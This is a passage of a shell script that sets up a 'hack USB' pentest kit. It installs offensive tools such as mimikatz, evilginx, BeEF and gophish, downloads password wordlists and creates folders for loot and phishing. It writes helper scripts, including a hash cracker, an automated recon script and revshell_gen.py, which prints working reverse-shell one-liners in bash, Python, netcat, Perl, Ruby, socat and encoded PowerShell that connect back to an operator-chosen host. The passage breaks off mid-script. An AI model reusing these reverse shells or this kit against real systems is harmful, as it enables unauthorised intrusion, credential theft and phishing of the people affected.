  log_step "WINDOWS NATIVE — $PKG_MGR"
  echo -e "  ${YELLOW}Note:${NC} Many Linux tools unavailable on native Windows."
  echo -e "  ${CYAN}Recommendation:${NC} Install WSL2 for full compatibility."
  echo ""

  case "$PKG_MGR" in
    winget)
      log_info "Installing via winget ..."
      local win_pkgs=(
        "Git.Git" "Python.Python.3.12" "Golang.Go"
        "Nmap.Nmap" "VeraCrypt.VeraCrypt"
        "Microsoft.WindowsTerminal" "OpenJS.NodeJS.LTS"
        "RubyInstallerTeam.RubyWithDevKit.3.2"
      )
      for pkg in "${win_pkgs[@]}"; do
        log_info "winget install $pkg ..."
        winget install --id "$pkg" --accept-source-agreements --accept-package-agreements \
          >> "$LOG_FILE" 2>&1 \
          && log_ok "$pkg ✓" || log_warn "$pkg — failed"
      done ;;
    choco)
      log_info "Installing via Chocolatey ..."
      local choco_pkgs=(git python3 golang nmap nodejs ruby veracrypt wireshark npcap)
      for pkg in "${choco_pkgs[@]}"; do
        choco install -y "$pkg" >> "$LOG_FILE" 2>&1 \
          && log_ok "$pkg ✓" || log_warn "$pkg — failed"
      done ;;
    scoop)
      log_info "Installing via Scoop ..."
      scoop bucket add extras 2>/dev/null || true
      local scoop_pkgs=(git python go nmap nodejs ruby)
      for pkg in "${scoop_pkgs[@]}"; do
        scoop install "$pkg" >> "$LOG_FILE" 2>&1 \
          && log_ok "$pkg ✓" || log_warn "$pkg — failed"
      done ;;
    *)
      log_warn "No package manager found — install manually"
      echo -e "  ${GREEN}winget install Git.Git Python.Python.3.12 Golang.Go Nmap.Nmap OpenJS.NodeJS.LTS${NC}" ;;
  esac
}

# ── Node.js ──────────────────────────────────────────────────────────
_install_nodejs() {
  log_step "NODE.JS ${NODE_VERSION} LTS"
  if command -v node &>/dev/null; then
    local ver; ver=$(node --version 2>/dev/null | tr -d 'v' | cut -d. -f1)
    if (( ver >= 18 )); then
      log_ok "Node.js $(node --version) — already up to date"
      log_ok "npm $(npm --version)"
      _setup_npm_prefix
      _install_npm_tools
      return
    fi
    log_warn "Node.js v${ver} too old (< 18) — upgrading..."
  fi

  case "$OS_TYPE" in
    macos)
      log_info "Installing nvm as $REAL_USER ..."
      run_as_user 'export NVM_DIR="$HOME/.nvm"; curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash' >> "$LOG_FILE" 2>&1
      local nvm_dir="$REAL_HOME/.nvm"
      export NVM_DIR="$nvm_dir"
      [[ -s "$nvm_dir/nvm.sh" ]] && source "$nvm_dir/nvm.sh" 2>/dev/null || true
      run_as_user "export NVM_DIR=\"$nvm_dir\"; source \"$nvm_dir/nvm.sh\"; nvm install $NODE_VERSION && nvm alias default $NODE_VERSION" >> "$LOG_FILE" 2>&1
      if ! command -v node &>/dev/null; then
        log_warn "nvm failed — fallback: brew install node@${NODE_VERSION}"
        run_as_user "brew install node@${NODE_VERSION} && brew link --force --overwrite node@${NODE_VERSION}" >> "$LOG_FILE" 2>&1 || true
      fi
      grep -q "NVM_DIR" "$SHELL_RC" 2>/dev/null || cat >> "$SHELL_RC" << 'NVMRC'
# nvm — Node Version Manager
export NVM_DIR="$HOME/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] && source "$NVM_DIR/nvm.sh"
[ -s "$NVM_DIR/bash_completion" ] && source "$NVM_DIR/bash_completion"
NVMRC
      ;;
    linux|windows_wsl)
      log_info "Setting up NodeSource repo (Node.js ${NODE_VERSION})..."
      curl -fsSL "https://deb.nodesource.com/setup_${NODE_VERSION}.x" | sudo bash - >> "$LOG_FILE" 2>&1
      sudo apt-get install -y -qq nodejs >> "$LOG_FILE" 2>&1
      if ! command -v node &>/dev/null || [[ "$(node --version 2>/dev/null | tr -d 'v' | cut -d. -f1)" -lt 18 ]]; then
        log_warn "NodeSource failed — fallback: nvm"
        curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash >> "$LOG_FILE" 2>&1
        export NVM_DIR="$REAL_HOME/.nvm"
        [[ -s "$NVM_DIR/nvm.sh" ]] && source "$NVM_DIR/nvm.sh" 2>/dev/null || true
        nvm install $NODE_VERSION >> "$LOG_FILE" 2>&1 || true
        grep -q "NVM_DIR" "$SHELL_RC" 2>/dev/null || echo 'export NVM_DIR="$HOME/.nvm"; [ -s "$NVM_DIR/nvm.sh" ] && source "$NVM_DIR/nvm.sh"' >> "$SHELL_RC"
      fi ;;
    windows_native)
      log_info "Node.js should be installed via $PKG_MGR"
      command -v node &>/dev/null && log_ok "Node.js $(node --version)" || log_warn "Node.js not found — https://nodejs.org"
      return ;;
  esac

  command -v node &>/dev/null \
    && { log_ok "Node.js $(node --version) ✓"; log_ok "npm $(npm --version)"; } \
    || log_err "Node.js not installed — manual: https://nodejs.org"

  _setup_npm_prefix
  _install_npm_tools
}

_setup_npm_prefix() {
  command -v npm &>/dev/null || return
  local prefix="$REAL_HOME/.npm-global"
  npm config set prefix "$prefix" 2>/dev/null || true
  export PATH="$prefix/bin:$PATH"
  grep -q "npm-global" "$SHELL_RC" 2>/dev/null || \
    echo "export PATH=\"\$HOME/.npm-global/bin:\$PATH\"" >> "$SHELL_RC"
}

_install_npm_tools() {
  command -v npm &>/dev/null || return
  log_info "Installing npm global tools..."
  local npm_tools=(retire wappalyzer-cli snyk @bugcrowd/codeql-queries @lhideki/xsshunter-ts)
  for tool in "${npm_tools[@]}"; do
    npm list -g "$tool" &>/dev/null 2>&1 \
      && log_ok "npm: $tool — already installed" \
      || { npm install -g "$tool" --silent >> "$LOG_FILE" 2>&1 \
           && log_ok "npm: $tool ✓" || log_warn "npm: $tool — failed"; }
  done
}

# ── Ruby ─────────────────────────────────────────────────────────────
_install_ruby() {
  log_step "RUBY GEMS"
  command -v gem &>/dev/null || { log_warn "gem not found — Ruby gems skipped"; return; }
  log_ok "Ruby $(ruby --version 2>&1 | cut -d' ' -f2)"
  local gems=(
    wpscan          # WordPress scanner
    evil-winrm      # WinRM shell
    byebug          # debugger
  )
  for gem in "${gems[@]}"; do
    gem list | grep -q "^$gem " \
      && log_ok "gem: $gem — already installed" \
      || { log_info "gem install $gem ..."
           gem install "$gem" --no-document >> "$LOG_FILE" 2>&1 \
             && log_ok "gem: $gem ✓" || log_warn "gem: $gem — failed"; }
  done
}

# ── Rust ─────────────────────────────────────────────────────────────
_install_rust() {
  log_step "RUST + CARGO TOOLS"
  if ! command -v cargo &>/dev/null; then
    log_info "Installing Rust via rustup..."
    curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y --no-modify-path >> "$LOG_FILE" 2>&1 || true
    export PATH="$REAL_HOME/.cargo/bin:$PATH"
    grep -q "cargo/bin" "$SHELL_RC" 2>/dev/null || echo 'export PATH="$HOME/.cargo/bin:$PATH"' >> "$SHELL_RC"
  fi
  command -v cargo &>/dev/null || { log_warn "cargo not found — Rust tools skipped"; return; }
  log_ok "Rust $(rustc --version 2>&1 | cut -d' ' -f2)"
  local cargo_tools=(
    feroxbuster   # fast web fuzzer
    rustscan      # fast port scanner
  )
  for tool in "${cargo_tools[@]}"; do
    command -v "$tool" &>/dev/null \
      && log_ok "cargo: $tool — already installed" \
      || { log_info "cargo install $tool ..."
           cargo install "$tool" >> "$LOG_FILE" 2>&1 \
             && log_ok "cargo: $tool ✓" || log_warn "cargo: $tool — failed"; }
  done
}

# ── Go Tools ─────────────────────────────────────────────────────────
_install_go_tools() {
  log_step "GO TOOLS"
  command -v go &>/dev/null || { log_warn "Go not installed — Go tools skipped"; return; }
  export GOPATH="${GOPATH:-$REAL_HOME/go}"
  export PATH="$GOPATH/bin:$PATH"
  grep -q "GOPATH\|go/bin" "$SHELL_RC" 2>/dev/null || cat >> "$SHELL_RC" << 'GORC'
export GOPATH="$HOME/go"
export PATH="$GOPATH/bin:$PATH"
GORC
  log_ok "Go $(go version | cut -d' ' -f3)"

  local go_tools=(
    "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
    "github.com/projectdiscovery/httpx/cmd/httpx@latest"
    "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
    "github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"
    "github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
    "github.com/projectdiscovery/katana/cmd/katana@latest"
    "github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"
    "github.com/ffuf/ffuf/v2@latest"
    "github.com/OJ/gobuster/v3@latest"
    "github.com/tomnomnom/waybackurls@latest"
    "github.com/tomnomnom/assetfinder@latest"
    "github.com/tomnomnom/httprobe@latest"
    "github.com/tomnomnom/gf@latest"
    "github.com/tomnomnom/anew@latest"
    "github.com/tomnomnom/qsreplace@latest"
    "github.com/tomnomnom/unfurl@latest"
    "github.com/lc/gau/v2/cmd/gau@latest"
    "github.com/hakluke/hakrawler@latest"
    "github.com/owasp-amass/amass/v4/...@master"
  )

  local total=${#go_tools[@]} i=0
  for pkg in "${go_tools[@]}"; do
    i=$(( i + 1 ))
    local name="${pkg##*/}"; name="${name%%@*}"
    command -v "$name" &>/dev/null \
      && log_ok "[$i/$total] go: $name — already installed" \
      || { log_info "[$i/$total] go install $name ..."
           go install "$pkg" >> "$LOG_FILE" 2>&1 \
             && log_ok "[$i/$total] $name ✓" \
             || log_warn "[$i/$total] $name — failed"; }
  done
}

# ── Python pip Tools ─────────────────────────────────────────────────
_install_pip_tools() {
  log_step "PYTHON PIP TOOLS"
  command -v pip3 &>/dev/null || { log_warn "pip3 missing"; return; }
  log_ok "Python $(python3 --version 2>&1 | cut -d' ' -f2)"

  _pip() { pip3 install --quiet --break-system-packages "$1" >> "$LOG_FILE" 2>&1 \
           || pip3 install --quiet "$1" >> "$LOG_FILE" 2>&1; }

  local pip_pkgs=(
    # Core pentest
    impacket certipy-ad bloodhound pwntools scapy
    # Network
    shodan paramiko requests
    # Web
    beautifulsoup4 mitmproxy httpx
    # Forensics
    volatility3 pyOpenSSL cryptography
    # OSINT
    dnspython theHarvester
    # Misc
    rich click colorama tqdm
  )

  local i=0 total=${#pip_pkgs[@]}
  for pkg in "${pip_pkgs[@]}"; do
    i=$(( i + 1 ))
    log_info "[$i/$total] pip install $pkg ..."
    _pip "$pkg" && log_ok "[$i/$total] $pkg ✓" || log_warn "[$i/$total] $pkg — failed"
  done
}

_persist_path() {
  log_step "UPDATE PATH"
  local changes=0
  command -v go  &>/dev/null && ! grep -q "go/bin\|GOPATH" "$SHELL_RC" 2>/dev/null && \
    { echo 'export GOPATH="$HOME/go"'; echo 'export PATH="$GOPATH/bin:$PATH"'; } >> "$SHELL_RC" && changes=$(( changes + 1 ))
  command -v npm &>/dev/null && ! grep -q "npm-global" "$SHELL_RC" 2>/dev/null && \
    echo 'export PATH="$HOME/.npm-global/bin:$PATH"' >> "$SHELL_RC" && changes=$(( changes + 1 ))
  [[ "$OS_TYPE" == "macos" && -f /opt/homebrew/bin/brew ]] && ! grep -q "homebrew" "$SHELL_RC" 2>/dev/null && \
    echo 'eval "$(/opt/homebrew/bin/brew shellenv)"' >> "$SHELL_RC" && changes=$(( changes + 1 ))
  ! grep -q "cargo/bin" "$SHELL_RC" 2>/dev/null && [[ -d "$REAL_HOME/.cargo/bin" ]] && \
    echo 'export PATH="$HOME/.cargo/bin:$PATH"' >> "$SHELL_RC" && changes=$(( changes + 1 ))
  (( changes > 0 )) && log_ok "$changes PATH entries added to $SHELL_RC" || log_ok "PATH already complete"
  log_info "Open new shell or: source $SHELL_RC"
}

# ╔══════════════════════════════════════════════════════════╗
# ║  STEP 7 — DIRECTORY STRUCTURE                           ║
# ╚══════════════════════════════════════════════════════════╝
create_structure() {
  section "STEP 7 — DIRECTORY STRUCTURE"
  local dirs=(
    "01_recon" "02_scanning" "03_exploitation" "04_post-exploit"
    "05_wireless" "06_password" "07_forensics" "08_scripts"
    "09_wordlists" "10_cheatsheets" "11_reports" "12_isos"
    "13_adblocker/hosts_lists" "13_adblocker/pihole" "14_vault"
    "15_loot" "16_phishing"
  )
  for d in "${dirs[@]}"; do mkdir -p "$USB_ROOT/$d" && log_ok "/$d"; done
  cat > "$USB_ROOT/README.md" << EOF
# HACK USB — $(date '+%Y-%m-%d')
Profile: $INSTALL_PROFILE | OS: $OS_TYPE | Stick: ${USB_SIZE_GB} GB
Auto-Update: $([[ $ENABLE_AUTOUPDATE -eq 1 ]] && echo YES || echo no)
Vault:       $([[ $ENABLE_VAULT      -eq 1 ]] && echo "YES (${VAULT_SIZE_MB} MB AES-256)" || echo no)
Ad-Blocker:  $([[ $ENABLE_ADBLOCKER  -eq 1 ]] && echo YES || echo no)

macOS:          zsh hackusb_setup.zsh       (NO sudo)
Linux:          sudo zsh hackusb_setup.zsh
Windows WSL2:   zsh hackusb_setup.zsh
Windows Native: zsh hackusb_setup.zsh       (Git Bash)
EOF
  log_ok "README.md created"
}

# ╔══════════════════════════════════════════════════════════╗
# ║  STEP 8 — CLONE TOOLS                                   ║
# ╚══════════════════════════════════════════════════════════╝
clone_tools() {
  section "STEP 8 — CLONE TOOLS"
  local -a paths=(
    "01_recon/theHarvester"         "01_recon/sherlock"           "01_recon/spiderfoot"
    "01_recon/recon-ng"             "01_recon/osrframework"
    "02_scanning/nuclei-templates"  "02_scanning/nmap-vulners"    "02_scanning/nmap-scripts-extra"
    "03_exploitation/sqlmap"        "03_exploitation/XSStrike"    "03_exploitation/commix"
    "03_exploitation/BeEF"          "03_exploitation/evilginx2"
    "03_exploitation/PayloadsAllTheThings"
    "04_post-exploit/PEASS-ng"      "04_post-exploit/BloodHound"  "04_post-exploit/impacket"
    "04_post-exploit/NetExec"       "04_post-exploit/CrackMapExec"
    "04_post-exploit/mimikatz"
    "05_wireless/wifite2"           "05_wireless/bettercap"       "05_wireless/hcxtools"
    "05_wireless/airgeddon"
    "06_password/hashcat-utils"     "06_password/john"            "06_password/cupp"
    "07_forensics/volatility3"      "07_forensics/binwalk"        "07_forensics/autopsy"
    "09_wordlists/SecLists"         "09_wordlists/fuzzdb"
    "16_phishing/gophish"           "16_phishing/evilginx3"
  )
  local -a urls=(
    "https://github.com/laramies/theHarvester"
    "https://github.com/sherlock-project/sherlock"
    "https://github.com/smicallef/spiderfoot"
    "https://github.com/lanmaster53/recon-ng"
    "https://github.com/i3visio/osrframework"
    "https://github.com/projectdiscovery/nuclei-templates"
    "https://github.com/vulnersCom/nmap-vulners"
    "https://github.com/cldrn/nmap-nse-scripts"
    "https://github.com/sqlmapproject/sqlmap"
    "https://github.com/s0md3v/XSStrike"
    "https://github.com/commixproject/commix"
    "https://github.com/beefproject/beef"
    "https://github.com/kgretzky/evilginx2"
    "https://github.com/swisskyrepo/PayloadsAllTheThings"
    "https://github.com/carlospolop/PEASS-ng"
    "https://github.com/BloodHoundAD/BloodHound"
    "https://github.com/fortra/impacket"
    "https://github.com/Pennyw0rth/NetExec"
    "https://github.com/byt3bl33d3r/CrackMapExec"
    "https://github.com/gentilkiwi/mimikatz"
    "https://github.com/derv82/wifite2"
    "https://github.com/bettercap/bettercap"
    "https://github.com/ZerBea/hcxtools"
    "https://github.com/v1s1t0r1sh3r3/airgeddon"
    "https://github.com/hashcat/hashcat-utils"
    "https://github.com/openwall/john"
    "https://github.com/Mebus/cupp"
    "https://github.com/volatilityfoundation/volatility3"
    "https://github.com/ReFirmLabs/binwalk"
    "https://github.com/sleuthkit/autopsy"
    "https://github.com/danielmiessler/SecLists"
    "https://github.com/fuzzdb-project/fuzzdb"
    "https://github.com/gophish/gophish"
    "https://github.com/kgretzky/evilginx3"
  )
  local -a profiles=(
    "minimal" "minimal" "minimal" "minimal" "minimal"
    "minimal" "minimal" "standard"
    "minimal" "minimal" "minimal" "standard" "standard"
    "standard"
    "standard" "standard" "standard" "standard" "standard" "standard"
    "standard" "standard" "standard" "standard"
    "minimal" "minimal" "minimal"
    "standard" "standard" "full"
    "standard" "standard"
    "full" "full"
  )

  local total=${#paths[@]}
  for (( i=1; i<=total; i++ )); do
    local p="${paths[$i]}" u="${urls[$i]}" pr="${profiles[$i]}"
    local name="${p##*/}"
    [[ "$INSTALL_PROFILE" == "minimal"  && "$pr" != "minimal"  ]] && { log_warn "[$i/$total] $name — skip (minimal)"; continue; }
    [[ "$INSTALL_PROFILE" == "standard" && "$pr" == "full"     ]] && { log_warn "[$i/$total] $name — skip (standard)"; continue; }
    local dest="$USB_ROOT/$p"
    [[ -d "$dest/.git" ]] && { log_warn "[$i/$total] $name — already cloned"; continue; }
    log_info "[$i/$total] Cloning $name ..."
    git clone --depth=1 "$u" "$dest" >> "$LOG_FILE" 2>&1 \
      && log_ok "[$i/$total] $name ✓" \
      || log_err "[$i/$total] $name — ERROR"
  done

  _setup_nmap_scripts

  log_step "PYTHON REQUIREMENTS FOR TOOLS"
  for entry in "01_recon/theHarvester" "01_recon/sherlock" "03_exploitation/XSStrike" \
               "03_exploitation/commix" "07_forensics/volatility3" "01_recon/spiderfoot" \
               "01_recon/recon-ng" "01_recon/osrframework"; do
    local req="$USB_ROOT/$entry/requirements.txt"
    [[ -f "$req" ]] || continue
    local name="${entry##*/}"
    log_info "pip install $name requirements..."
    pip3 install --quiet --break-system-packages -r "$req" >> "$LOG_FILE" 2>&1 \
      && log_ok "$name requirements ✓" || log_warn "$name requirements — failed"
  done

  local hcu="$USB_ROOT/06_password/hashcat-utils/src"
  [[ -d "$hcu" ]] && command -v make &>/dev/null && command -v gcc &>/dev/null && {
    log_info "Compiling hashcat-utils..."
    (cd "$hcu" && make >> "$LOG_FILE" 2>&1) && log_ok "hashcat-utils ✓" || log_warn "hashcat-utils compile failed"
  }

  local beef="$USB_ROOT/03_exploitation/BeEF"
  [[ -f "$beef/package.json" ]] && command -v npm &>/dev/null && {
    command -v ruby &>/dev/null && log_ok "Ruby $(ruby --version 2>&1 | cut -d' ' -f2) present (BeEF)" || log_warn "BeEF: Ruby missing — brew install ruby / sudo apt install ruby-full"
    log_info "BeEF: npm install ..."
    (cd "$beef" && npm install --silent >> "$LOG_FILE" 2>&1) && log_ok "BeEF npm ✓" || log_warn "BeEF npm failed"
  }
}

_setup_nmap_scripts() {
  local src="$USB_ROOT/02_scanning/nmap-vulners/vulners.nse"
  [[ -f "$src" ]] || return
  local dst=""
  for d in /usr/share/nmap/scripts /usr/local/share/nmap/scripts /opt/homebrew/share/nmap/scripts; do
    [[ -d "$d" ]] && dst="$d" && break
  done
  if [[ -n "$dst" ]]; then
    cp "$src" "$dst/" 2>/dev/null && nmap --script-updatedb >> "$LOG_FILE" 2>&1 \
      && log_ok "vulners.nse → $dst/" \
      || log_warn "No write access to $dst — use directly: nmap --script $src -sV target"
  else
    log_info "Use nmap-vulners directly: nmap --script $src -sV target"
  fi
}

# ╔══════════════════════════════════════════════════════════╗
# ║  STEP 9 — WORDLISTS                                     ║
# ╚══════════════════════════════════════════════════════════╝
download_wordlists() {
  section "STEP 9 — WORDLISTS"
  local wl_dir="$USB_ROOT/09_wordlists"
  local rockyou="$wl_dir/rockyou.txt"

  if [[ -f "$rockyou" ]] && (( $(wc -l < "$rockyou" 2>/dev/null) > 1000000 )); then
    log_warn "rockyou.txt exists ($(wc -l < "$rockyou" | tr -d ' ') lines) — skipped"
  else
    log_info "Downloading rockyou.txt (~130 MB)..."
    curl -L --progress-bar -o "$rockyou" \
      "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt" \
      >> "$LOG_FILE" 2>&1 \
      && log_ok "rockyou.txt ✓  ($(wc -l < "$rockyou" | tr -d ' ') lines)" \
      || log_err "Download failed"
  fi

  if [[ "$INSTALL_PROFILE" != "minimal" ]]; then
    # Additional wordlists
    local extra_wls=(
      "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt|10k-common.txt"
      "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt|top-usernames.txt"
      "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt|subdomains-5k.txt"
    )
    for entry in "${extra_wls[@]}"; do
      local url="${entry%%|*}" fname="${entry##*|}"
      [[ -f "$wl_dir/$fname" ]] && { log_ok "$fname — exists"; continue; }
      log_info "Downloading $fname ..."
      curl -sL -o "$wl_dir/$fname" "$url" >> "$LOG_FILE" 2>&1 \
        && log_ok "$fname ✓" || log_warn "$fname — failed"
    done
  fi
}

# ╔══════════════════════════════════════════════════════════╗
# ║  STEP 10 — CUSTOM SCRIPTS                               ║
# ╚══════════════════════════════════════════════════════════╝
write_scripts() {
  section "STEP 10 — CUSTOM SCRIPTS"
  local sd="$USB_ROOT/08_scripts"

  # ── auto_recon.zsh ────────────────────────────────────────
  cat > "$sd/auto_recon.zsh" << 'EOF'
#!/usr/bin/env zsh
# auto_recon.zsh | Needs: nmap, subfinder, gobuster, nikto, nuclei, httpx
# Usage: zsh auto_recon.zsh <TARGET> [--full]
TARGET="${1:?Usage: zsh auto_recon.zsh <TARGET>}"
FULL=0; [[ "${2:-}" == "--full" ]] && FULL=1
USB="${0:A:h:h}"
OUT="$USB/11_reports/recon_${TARGET}_$(date +%Y%m%d_%H%M%S)"
WL="$USB/09_wordlists/SecLists/Discovery/Web-Content/common.txt"
[[ -f "$WL" ]] || WL="$USB/09_wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt"
mkdir -p "$OUT"
echo "\n  AUTO RECON: $TARGET  →  $OUT\n"

echo "[1/7] Nmap SYN scan..."
command -v nmap &>/dev/null && nmap -sV -sC -O --open -T4 "$TARGET" -oA "$OUT/nmap_quick" 2>/dev/null || echo "  ! nmap missing"
echo "\n[2/7] Nmap all ports..."
command -v nmap &>/dev/null && nmap -p- -T4 --open "$TARGET" -oA "$OUT/nmap_allports" 2>/dev/null || true
echo "\n[3/7] Subfinder..."
command -v subfinder &>/dev/null && subfinder -d "$TARGET" -silent -o "$OUT/subdomains.txt" && echo "  → $(wc -l < $OUT/subdomains.txt | tr -d ' ') subdomains" || echo "  ! subfinder missing"
echo "\n[4/7] HTTP probe..."
command -v httpx &>/dev/null && [[ -f "$OUT/subdomains.txt" ]] && httpx -l "$OUT/subdomains.txt" -silent -o "$OUT/live_hosts.txt" && echo "  → $(wc -l < $OUT/live_hosts.txt | tr -d ' ') live" || true
echo "\n[5/7] Gobuster dir..."
command -v gobuster &>/dev/null && [[ -f "$WL" ]] && gobuster dir -u "http://$TARGET" -w "$WL" -o "$OUT/gobuster.txt" --no-error -q -t 30 2>/dev/null && echo "  → $(wc -l < $OUT/gobuster.txt | tr -d ' ') entries" || echo "  ! gobuster/wordlist missing"
echo "\n[6/7] Nikto..."
command -v nikto &>/dev/null && nikto -h "$TARGET" -o "$OUT/nikto.txt" -Format txt 2>/dev/null || echo "  ! nikto missing"
echo "\n[7/7] Nuclei..."
command -v nuclei &>/dev/null && nuclei -u "http://$TARGET" -silent -o "$OUT/nuclei.txt" 2>/dev/null || echo "  ! nuclei missing"
if [[ $FULL -eq 1 ]]; then
  echo "\n[+] OSINT: WaybackURLs..."
  command -v waybackurls &>/dev/null && echo "$TARGET" | waybackurls > "$OUT/wayback.txt" 2>/dev/null && echo "  → $(wc -l < $OUT/wayback.txt | tr -d ' ') urls"
  echo "\n[+] JS files via katana..."
  command -v katana &>/dev/null && katana -u "http://$TARGET" -silent -o "$OUT/katana.txt" 2>/dev/null && echo "  → $(wc -l < $OUT/katana.txt | tr -d ' ') endpoints"
fi
echo "\n  ✓ Results: $OUT\n"
EOF

  # ── hashcrack.py ─────────────────────────────────────────
  cat > "$sd/hashcrack.py" << 'EOF'
#!/usr/bin/env python3
"""hashcrack.py | Needs: python3 | Usage: python3 hashcrack.py <HASH> [WORDLIST]"""
import hashlib,sys,os,time
ALGOS={32:["md5"],40:["sha1"],56:["sha224"],64:["sha256"],96:["sha384"],128:["sha512"]}
def crack(h,wl):
    h=h.strip().lower(); algos=ALGOS.get(len(h),["md5","sha1","sha256","sha512"])
    print(f"\n  Hash: {h}\n  Algo: {', '.join(algos)}\n  WL:   {wl}\n  {'─'*50}")
    if not os.path.exists(wl): print(f"  ✗ Wordlist not found: {wl}"); sys.exit(1)
    t=time.time(); n=0
    with open(wl,"r",errors="ignore") as f:
        for line in f:
            w=line.strip(); n+=1
            for a in algos:
                if hashlib.new(a,w.encode()).hexdigest()==h:
                    print(f"\n  ✓ CRACKED! [{a.upper()}]  {w}  ({n:,} tries, {time.time()-t:.1f}s)\n"); return
            if n%500000==0: print(f"  … {n/1e6:.1f}M ({n/(time.time()-t)/1000:.0f}k/s)",end="\r")
    print(f"\n  ✗ Not found ({n:,} tries)\n")
if __name__=="__main__":
    sd=os.path.dirname(os.path.abspath(__file__))
    wl=sys.argv[2] if len(sys.argv)>2 else os.path.join(os.path.dirname(sd),"09_wordlists","rockyou.txt")
    crack(sys.argv[1] if len(sys.argv)>1 else (print(__doc__) or sys.exit(1)), wl)
EOF

  # ── revshell_gen.py ───────────────────────────────────────
  cat > "$sd/revshell_gen.py" << 'EOF'
#!/usr/bin/env python3
"""revshell_gen.py | Needs: python3 | Usage: python3 revshell_gen.py <LHOST> <LPORT>"""
import sys,base64
def gen(lh,lp):
    p=int(lp)
    b64ps=base64.b64encode(f"$client=New-Object Net.Sockets.TCPClient('{lh}',{p});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){{$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()".encode('utf-16-le')).decode()
    shells={
        "Bash TCP":       f"bash -i >& /dev/tcp/{lh}/{p} 0>&1",
        "Bash UDP":       f"bash -i >& /dev/udp/{lh}/{p} 0>&1",
        "Python3":        f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lh}\",{p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "Python3 pty":    f"python3 -c 'import socket,subprocess,pty;s=socket.socket();s.connect((\"{lh}\",{p}));[__import__(\"os\").dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'",
        "PHP":            f"php -r '$sock=fsockopen(\"{lh}\",{p});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "PHP proc_open":  f"php -r '$p=proc_open(\"/bin/sh\",array(array(\"socket\"),array(\"socket\"),array(\"socket\")),$pipes,null,null,array(\"bypass_open_basedir\"=>true));socket_connect($s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP),\"{lh}\",{p});while(!feof($pipes[1]))socket_send($s,fgets($pipes[1]),4096,0);'",
        "Netcat mkfifo":  f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {lh} {p} >/tmp/f",
        "Netcat -e":      f"nc -e /bin/sh {lh} {p}",
        "Perl":           f"perl -e 'use Socket;$i=\"{lh}\";$p={p};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
        "Ruby":           f"ruby -rsocket -e'f=TCPSocket.open(\"{lh}\",{p}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "PowerShell B64": f"powershell -EncodedCommand {b64ps}",
        "Socat":          f"socat tcp-connect:{lh}:{p} exec:/bin/sh,pty,stderr,setsid,sigint,sane",
    }
    print(f"\n  LHOST={lh}  LPORT={p}  |  Listener: nc -lvnp {p}\n  {'═'*62}")
    for n,c in shells.items(): print(f"\n  [{n}]\n  {c}")
    print(f"\n  {'─'*62}")
    print(f"  UPGRADE SHELL:")
    print(f"  python3 -c 'import pty;pty.spawn(\"/bin/bash\")'")
    print(f"  export TERM=xterm && stty raw -echo; fg")
    print(f"  {'═'*62}\n")
if __name__=="__main__":
    if len(sys.argv)<3: print(__doc__); sys.exit(1)
    gen(sys.argv[1],sys.argv[2])
EOF

  # ── livehosts.py ─────────────────────────────────────────
  cat > "$sd/livehosts.py" << 'EOF'
#!/usr/bin/env python3
"""livehosts.py | Needs: python3 | Usage: python3 livehosts.py <CIDR> e.g. 192.168.1.0/24"""
import subprocess,sys,ipaddress,concurrent.futures,time,platform
def ping(ip):
    flag="-n" if platform.system()=="Windows" else "-c"
    r=subprocess.run(["ping",flag,"1","-W","1",str(ip)],capture_output=True,timeout=3)
    return str(ip) if r.returncode==0 else None
def scan(cidr):
    hosts=list(ipaddress.ip_network(cidr,strict=False).hosts())
    print(f"\n  Network: {cidr}  |  {len(hosts)} hosts\n"); live=[]; t=time.time()
    with concurrent.futures.ThreadPoolExecutor(max_workers=150) as ex:
        for r in concurrent.futures.as_completed({ex.submit(ping,ip):ip for ip in hosts}):
            v=r.result()
            if v: live.append(v); print(f"  ✓ LIVE: {v}")
    live.sort(key=lambda x: tuple(int(i) for i in x.split(".")))
    with open("live_hosts.txt","w") as f: f.write("\n".join(live))
    print(f"\n  {len(live)} live hosts  ({time.time()-t:.1f}s)  → live_hosts.txt\n")
if __name__=="__main__":
    if len(sys.argv)<2: print(__doc__); sys.exit(1)
    scan(sys.argv[1])
EOF

  # ── port_scan.py ─────────────────────────────────────────
  cat > "$sd/port_scan.py" << 'EOF'
#!/usr/bin/env python3
"""port_scan.py | Needs: python3 | Usage: python3 port_scan.py <HOST> [port_range]"""
import socket,sys,concurrent.futures,time
def scan_port(host,port):
    try:
